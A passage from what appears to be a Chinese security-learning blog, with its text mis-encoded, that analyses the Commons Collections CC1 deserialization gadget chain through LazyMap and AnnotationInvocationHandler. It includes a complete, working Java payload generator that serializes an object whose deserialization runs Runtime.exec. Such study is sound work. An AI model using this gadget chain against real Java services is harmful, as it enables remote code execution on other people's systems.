title="LazyMap"></a>LazyMap</h3><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/20230918225731.png">â€‹<p>åœ¨LazyMapä¸­å­˜åœ¨ä¸€ä¸ªgetæ–¹æ³•ï¼Œå®ƒä¼šè°ƒç”¨è¿™ä¸ª<code>dactory.transform()</code>â€‹æ–¹æ³•ï¼Œè€Œè¿™ä¸ªfactoryæ˜¯å¯æ§çš„</p><p>æŸ¥çœ‹å“ªé‡Œè°ƒç”¨äº†getæ–¹æ³•ï¼ˆè¿™é‡Œå› ä¸ºå¤ªå¤šä¸å¥½æ‰¾ï¼ŒæŸ¥çœ‹æºç å‘ç°æ˜¯é€šè¿‡å»<code>AnnotationInvocationHandler</code>â€‹ä¸­è°ƒç”¨äº†getï¼‰</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/20230918230510.png">â€‹<p>å‘ç°åœ¨invokeä¸­è°ƒç”¨äº†getæ–¹æ³•ï¼ˆæœ‰5ä¸ªåœ°æ–¹åŒæ ·è°ƒç”¨äº†ï¼Œä½†æ˜¯æ— æ³•æ§åˆ¶ï¼‰è¿™é‡Œçš„memberValueså¯ä»¥æ§åˆ¶</p><p>è€Œè¿™é‡Œçš„invokeæ–¹æ³•å¯ä»¥é€šè¿‡æ‰§è¡ŒåŠ¨æ€ä»£ç†æ¥è‡ªåŠ¨æ‰§è¡Œï¼ˆå³ä¸ç®¡å¤–éƒ¨è°ƒç”¨äº†ä»€ä¹ˆæ–¹æ³•éƒ½ä¼šæ‰§è¡Œï¼‰</p><p>â€</p><p>è¿™é‡Œéœ€è¦ä¸€ä¸ªåŠ¨æ€ä»£ç†ï¼Œè¿™ä¸ªåŠ¨æ€ä»£ç†éœ€è¦è°ƒç”¨<code>AnnotationInvocationHandler</code>â€‹çš„å¤„ç†å™¨ç±»ï¼Œè°ƒç”¨å®ƒçš„æŸä¸€ä¸ªæ–¹æ³•å°±ä¼šæ‰§è¡Œincokeï¼Œè€Œæœ€å¤–å±‚éœ€è¦ä¸€ä¸ªæ¥æ”¶ä¸€ä¸ªæ¥å£çš„</p><p>è¿™æ—¶éœ€è¦ç¡®å®šçš„æ˜¯è°ƒç”¨ä»€ä¹ˆæ–¹æ³•ï¼Œ</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/20230918231029.png">â€‹<p>è¿™é‡Œä¹Ÿè¯´æ˜äº†ä¸å…è®¸è°ƒç”¨<code>equals</code>â€‹æ–¹æ³•ï¼Œè¿˜ä¸èƒ½è°ƒç”¨ä¸€ä¸ªæœ‰å‚æ–¹æ³•</p><p>â€</p><p>â€</p><p>â€</p><pre><code class="java">package ccTest;

import jdk.nashorn.internal.ir.CallNode;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class cc1_ysoserial &#123;

    public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException, ClassNotFoundException, IOException &#123;
        Transformer[] transformers = &#123;
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
        &#125;; // å°†ä¸Šè¯‰åºåˆ—åŒ–æ“ä½œè½¬ä¸ºtransformeræ”¯æŒçš„
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); // é€šè¿‡é€’å½’è°ƒç”¨

        HashMap&lt;Object, Object&gt; testMap = new HashMap&lt;&gt;(); // æ–°å»ºä¸€ä¸ªmap

        Map&lt;Object, Object&gt; decorate = LazyMap.decorate(testMap, chainedTransformer);


        Class&lt;?&gt; handlerClass = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); // å¯¹è±¡é€šè¿‡åå°„è·å–å…¶classå¯¹è±¡
        Constructor&lt;?&gt; declaredConstructor = handlerClass.getDeclaredConstructor(Class.class, Map.class); // è·å–å…¶æ„é€ æ–¹æ³•
        declaredConstructor.setAccessible(true); // å…³é—­CC1æ£€æµ‹
        InvocationHandler handler = (InvocationHandler) declaredConstructor.newInstance(Override.class, decorate); // åˆå§‹åŒ–è¯¥å¯¹è±¡

        Map map = (Map) Proxy.newProxyInstance(handlerClass.getClassLoader(), new Class[]&#123;Map.class&#125;, handler);

        Object o = declaredConstructor.newInstance(Override.class, map);
    

        serialize(o, &quot;cc1.ser&quot;); // åºåˆ—åŒ–è¯¥å¯¹è±¡
        deserialize(&quot;cc1.ser&quot;); // ååºåˆ—åŒ–è¯¥å¯¹è±¡ï¼Œç”±äºè¯¥å¯¹è±¡æ‰§è¡ŒreadObject()æ–¹æ³•ï¼Œä¼šéå†mapï¼ŒsetValueæ‰§è¡Œï¼Œå¯¼è‡´checkSetValueæ‰§è¡Œï¼Œæœ€ç»ˆè°ƒç”¨invokerTransformer.transformæ‰§è¡Œ
    &#125;
    public static Object deserialize(String filename) throws IOException, ClassNotFoundException &#123;
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object o = ois.readObject();
        ois.close();
        return o;
    &#125;

    public static void serialize(Object obj, String filename) throws IOException &#123;
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(filename));
        oos.writeObject(obj);
        oos.close();
    &#125;
&#125;
</code></pre><div class="tags"><a href="/tags/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"><i class="ic i-tag"></i> Javaä»£ç å®¡è®¡</a> <a href="/tags/%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/" rel="tag"><i class="ic i-tag"></i> åˆ©ç”¨é“¾åˆ†æ</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">æ›´æ–°äº</span> <time title="ä¿®æ”¹æ—¶é—´ï¼š2023-12-25 23:20:25" itemprop="dateModified" datetime="2023-12-25T23:20:25+08:00">2023-12-25</time></span></div><div class="reward"><button><i class="ic i-heartbeat"></i> èµèµ</button><p>è¯·æˆ‘å–[èŒ¶]~(ï¿£â–½ï¿£)~*</p><div id="qr"><div><img data-src="/images/wechatpay.png" alt="ä½™æ˜Ÿé…’ å¾®ä¿¡æ”¯ä»˜"><p>å¾®ä¿¡æ”¯ä»˜</p></div><div><img data-src="/images/alipay.png" alt="ä½™æ˜Ÿé…’ æ”¯ä»˜å®"><p>æ”¯ä»˜å®</p></div><div><img data-src="/images/paypal.png" alt="ä½™æ˜Ÿé…’ è´å®"><p>è´å®</p></div></div></div><div id="copyright"><ul><li class="author"><strong>æœ¬æ–‡ä½œè€…ï¼š </strong>ä½™æ˜Ÿé…’ <i class="ic i-at"><em>@</em></i>ä½™æ˜Ÿé…’</li><li class="link"><strong>æœ¬æ–‡é“¾æ¥ï¼š</strong> <a href="http://example.com/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/" title="CC1åˆ†æ">http://example.com/APT/ä»£ç å®¡è®¡/Javaä»£ç å®¡è®¡/ååºåˆ—åŒ–é“¾/CC1/</a></li><li class="license"><strong>ç‰ˆæƒå£°æ˜ï¼š </strong>æœ¬ç«™æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/Java%E5%8F%8D%E5%B0%84/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipet4bz0yj20zk0m8e81.jpg" title="Javaåå°„"><span class="type">ä¸Šä¸€ç¯‡</span> <span class="category"><i class="ic i-flag"></i> ä»£ç å®¡è®¡</span><h3>Javaåå°„</h3></a></div><div class="item right"><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/URLDNS%E9%93%BE/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giciukx8a7j20zk0m8aio.jpg" title="URLDNSé“¾"><span class="type">ä¸‹ä¸€ç¯‡</span> <span class="category"><i class="ic i-flag"></i> ä»£ç å®¡è®¡</span><h3>URLDNSé“¾</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="æ–‡ç« ç›®å½•"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CC1"><span class="toc-number">1.</span> <span class="toc-text">CC1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">æ‰‹åŠ¨åˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87"><span class="toc-number">2.1.</span> <span class="toc-text">å‰æœŸå‡†å¤‡</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jdk"><span class="toc-number">2.1.1.</span> <span class="toc-text">jdk</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84%E4%BB%B6"><span class="toc-number">2.1.2.</span> <span class="toc-text">ç»„ä»¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-number">2.1.3.</span> <span class="toc-text">æºç </span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E5%88%86%E6%9E%90"><span class="toc-number">2.2.</span> <span class="toc-text">ç±»åˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#InvokerTransformer"><span class="toc-number">2.2.1.</span> <span class="toc-text">InvokerTransformer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TransformeMap"><span class="toc-number">2.2.2.</span> <span class="toc-text">TransformeMap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AbstractInputCheckedMapDecorator"><span class="toc-number">2.2.3.</span> <span class="toc-text">AbstractInputCheckedMapDecorator</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AnnotationInvocationHandler"><span class="toc-number">2.2.4.</span> <span class="toc-text">AnnotationInvocationHandler</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">2.2.5.</span> <span class="toc-text">å°ç»“</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ConstantTransformer"><span class="toc-number">2.2.6.</span> <span class="toc-text">ConstantTransformer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ChainedTransformer"><span class="toc-number">2.2.7.</span> <span class="toc-text">ChainedTransformer</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%93%BE%E8%B7%AF%E6%95%B4%E7%90%86"><span class="toc-number">2.3.</span> <span class="toc-text">é“¾è·¯æ•´ç†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E7%BB%88%E4%BB%A3%E7%A0%81"><span class="toc-number">2.4.</span> <span class="toc-text">æœ€ç»ˆä»£ç </span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ysoserial-cc1%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">ysoserial-cc1åˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B1%BB%E5%88%86%E6%9E%90-1"><span class="toc-number">3.1.</span> <span class="toc-text">ç±»åˆ†æ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LazyMap"><span class="toc-number">3.1.1.</span> <span class="toc-text">LazyMap</span></a></li></ol></li></ol></li></ol></div><div class="related panel pjax" data-title="ç³»åˆ—æ–‡ç« "><ul><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/%E7%BC%96%E8%BE%91%E5%99%A8%E4%BD%BF%E7%94%A8/" rel="bookmark" title="ideaåŸºç¡€ä½¿ç”¨">ideaåŸºç¡€ä½¿ç”¨</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/" rel="bookmark" title="åŠ¨æ€ä»£ç†">åŠ¨æ€ä»£ç†</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/" rel="bookmark" title="ç±»åŠ¨æ€åŠ è½½">ç±»åŠ¨æ€åŠ è½½</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="bookmark" title="Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–">Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/Java%E5%8F%8D%E5%B0%84/" rel="bookmark" title="Javaåå°„">Javaåå°„</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E5%8F%8D%E5%B0%84/" rel="bookmark" title="Javaåå°„">Javaåå°„</a></li><li class="active"><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC1/" rel="bookmark" title="CC1åˆ†æ">CC1åˆ†æ</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/URLDNS%E9%93%BE/" rel="bookmark" title="URLDNSé“¾">URLDNSé“¾</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/shiro/" rel="bookmark" title="shiro">shiro</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/%E5%AE%A1%E8%AE%A1%E6%80%9D%E8%B7%AF/" rel="bookmark" title="å®¡è®¡æ€è·¯">å®¡è®¡æ€è·¯</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/JaveEE%E6%A0%B8%E5%BF%83/" rel="bookmark" title="10. JaveEEæ ¸å¿ƒ">10. JaveEEæ ¸å¿ƒ</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/" rel="bookmark" title="1. javaç±»åŠ è½½æœºåˆ¶">1. javaç±»åŠ è½½æœºåˆ¶</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/sun.misc.Unsafe/" rel="bookmark" title="3. sun.misc.Unsafe">3. sun.misc.Unsafe</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/" rel="bookmark" title="4. javaæ–‡ä»¶ç³»ç»Ÿå®‰å…¨">4. javaæ–‡ä»¶ç³»ç»Ÿå®‰å…¨</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Java%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="bookmark" title="5. javaæœ¬åœ°å‘½ä»¤æ‰§è¡Œ">5. javaæœ¬åœ°å‘½ä»¤æ‰§è¡Œ</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/JDBC/" rel="bookmark" title="6. JDBC">6. JDBC</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/%E6%B3%A8%E5%85%A5/" rel="bookmark" title="æ³¨å…¥">æ³¨å…¥</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/XXE/" rel="bookmark" title="XXE">XXE</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1/fastjson/" rel="bookmark" title="fastjson">fastjson</a></li><li><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/" rel="bookmark" title="Tomcatå†…å­˜é©¬">Tomcatå†…å­˜é©¬</a></li></ul></div><div class="overview panel" data-title="ç«™ç‚¹æ¦‚è§ˆ"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="ä½™æ˜Ÿé…’" data-src="/images/avatar.jpg"><p class="name" itemprop="name">ä½™æ˜Ÿé…’</p><div class="description" itemprop="description">æ¬¢è¿å‚è§‚æˆ‘çš„ç¬”è®°ç©ºé—´ ~ è¿™é‡Œä¸»è¦ä¼šè®°å½•ä¸€äº›å®‰å…¨ç›¸å…³çš„å­¦ä¹ ç¬”è®° ğŸŒ¸</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">253</span> <span class="name">æ–‡ç« </span></a></div><div class="item categories"><a href="/categories/"><span class="count">43</span> <span class="name">åˆ†ç±»</span></a></div><div class="item tags"><a href="/tags/"><span class="count">36</span> <span class="name">æ ‡ç­¾</span></a></div></nav><div class="social"></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>é¦–é¡µ</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>å…³äº</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>æ–‡ç« </a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>å½’æ¡£</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>åˆ†ç±»</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>æ ‡ç­¾</a></li></ul></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/Java%E5%8F%8D%E5%B0%84/" rel="prev" title="ä¸Šä¸€ç¯‡"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/URLDNS%E9%93%BE/" rel="next" title="ä¸‹ä¸€ç¯‡"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>éšæœºæ–‡ç« </h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/Program/" title="åˆ†ç±»äº ç¼–ç¨‹">ç¼–ç¨‹</a> <i class="ic i-angle-right"></i> <a href="/categories/Program/Golang/" title="åˆ†ç±»äº Golang">Golang</a> <i class="ic i-angle-right"></i> <a href="/categories/Program/Golang/%E9%A1%B9%E7%9B%AE/" title="åˆ†ç±»äº é¡¹ç›®">é¡¹ç›®</a></div><span><a href="/Program/golang/%E9%A1%B9%E7%9B%AE/TCP%E6%89%AB%E6%8F%8F%E5%99%A8%E5%92%8C%E4%BB%A3%E7%90%86/" title="TCPæ‰«æå™¨å’Œä»£ç†">TCPæ‰«æå™¨å’Œä»£ç†</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Network/" title="åˆ†ç±»äº ç½‘ç»œ">ç½‘ç»œ</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E5%8D%8E%E4%B8%BA%E9%98%B2%E7%81%AB%E5%A2%99/" title="åˆ†ç±»äº åä¸ºé˜²ç«å¢™">åä¸ºé˜²ç«å¢™</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E5%8D%8E%E4%B8%BA%E9%98%B2%E7%81%AB%E5%A2%99/%E5%AE%9E%E9%AA%8C/" title="åˆ†ç±»äº å®éªŒ">å®éªŒ</a></div><span><a href="/Network/%E5%8D%8E%E4%B8%BA%E9%98%B2%E7%81%AB%E5%A2%99/%E5%AE%9E%E9%AA%8C/%E9%98%B2%E7%81%AB%E5%A2%99%E5%8F%8C%E6%9C%BA%E7%83%AD%E5%A4%87/" title="é˜²ç«å¢™åŒæœºçƒ­å¤‡">é˜²ç«å¢™åŒæœºçƒ­å¤‡</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/Other/010-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/006-sql%20server%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E5%91%BD%E4%BB%A4/" title="æœªå‘½å">æœªå‘½å</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Network/" title="åˆ†ç±»äº ç½‘ç»œ">ç½‘ç»œ</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/" title="åˆ†ç±»äº æ·±ä¿¡æœè®¾å¤‡">æ·±ä¿¡æœè®¾å¤‡</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/%E5%AE%9E%E9%AA%8C/" title="åˆ†ç±»äº å®éªŒ">å®éªŒ</a></div><span><a href="/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/%E5%AE%9E%E9%AA%8C/AF/%E5%8B%92%E7%B4%A2%E9%98%B2%E6%8A%A4/" title="å‹’ç´¢é˜²æŠ¤">å‹’ç´¢é˜²æŠ¤</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Network/" title="åˆ†ç±»äº ç½‘ç»œ">ç½‘ç»œ</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/" title="åˆ†ç±»äº ç½‘ç»œåŸºç¡€">ç½‘ç»œåŸºç¡€</a></div><span><a href="/Network/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/HCIA/%E4%BB%A5%E5%A4%AA%E7%BD%91%E4%BA%A4%E6%8D%A2%E5%9F%BA%E7%A1%80/" title="ä»¥å¤ªç½‘äº¤æ¢åŸºç¡€">ä»¥å¤ªç½‘äº¤æ¢åŸºç¡€</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Network/" title="åˆ†ç±»äº ç½‘ç»œ">ç½‘ç»œ</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/" title="åˆ†ç±»äº æ·±ä¿¡æœè®¾å¤‡">æ·±ä¿¡æœè®¾å¤‡</a> <i class="ic i-angle-right"></i> <a href="/categories/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/AC/" title="åˆ†ç±»äº AC">AC</a></div><span><a href="/Network/%E6%B7%B1%E4%BF%A1%E6%9C%8D%E8%AE%BE%E5%A4%87/%E6%B7%B1%E4%BF%A1%E6%9C%8D/AC/%E7%BB%88%E7%AB%AF%E6%A3%80%E6%9F%A5/" title="ç»ˆç«¯æ£€æŸ¥">ç»ˆç«¯æ£€æŸ¥</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/Other/011-%E5%8F%8D%E5%BC%B9shell/007-Groovy%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BC%B9shell/" title="æœªå‘½å">æœªå‘½å</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="åˆ†ç±»äº ä»£ç å®¡è®¡">ä»£ç å®¡è®¡</a> <i class="ic i-angle-right"></i> <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" title="åˆ†ç±»äº Javaå®‰å…¨åŸºç¡€">Javaå®‰å…¨åŸºç¡€</a></div><span><a 